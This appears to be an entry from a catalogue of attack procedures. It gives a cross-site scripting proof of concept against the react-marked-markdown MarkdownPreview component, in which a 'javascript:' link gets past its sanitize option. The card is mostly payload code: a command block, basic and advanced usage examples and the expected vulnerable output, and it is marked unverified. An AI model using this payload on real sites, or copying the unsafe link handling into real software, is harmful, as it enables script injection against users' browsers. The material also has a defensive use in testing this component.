---
id: cmd-uuid-2
data: |-
  import React from 'react';
  import ReactDOM from 'react-dom';
  import { MarkdownPreview } from 'react-marked-markdown';

  ReactDOM.render(
    <MarkdownPreview
      markedOptions={{ sanitize: true }}
      value={'[XSS](javascript: alert`1`)'}
    />,
    document.getElementById('root')
  );
tags:
  - xss
  - render
  - react
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:07.838Z'
verified: false
validated: true
submitted: true
---
---

# render-markdownpreview-xss

## Command

```javascript
import React from 'react';
import ReactDOM from 'react-dom';
import { MarkdownPreview } from 'react-marked-markdown';

ReactDOM.render(
  <MarkdownPreview
    markedOptions={{ sanitize: true }}
    value={'[XSS](javascript: alert`1`)'}
  />,
  document.getElementById('root')
);
```

## Description

Renders the MarkdownPreview component with a malicious Markdown string, exploiting the unsanitized href to inject a javascript: alert payload.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `markedOptions` | Parser config with { sanitize: true } | Yes |
| `value` | Markdown input with '[XSS](javascript: alert`1`)' | Yes |
| `document.getElementById('root')` | Target DOM element | Yes |

## Examples

### Basic Usage

```javascript
ReactDOM.render(<MarkdownPreview markedOptions={{ sanitize: true }} value={'[XSS](javascript: alert`1`)'} />, document.getElementById('root'));
```

### Advanced Usage

```javascript
const md = '[XSS](javascript: alert`1`)';
ReactDOM.render(<MarkdownPreview markedOptions={{ sanitize: true }} value={md} />, root);
```

## Expected Output

Rendered link with href="javascript: alert`1`"; no errors, but vulnerable to execution.

## Related

- [[Related Procedure: Render-Malicious-Markdown-in-MarkdownPreview]]

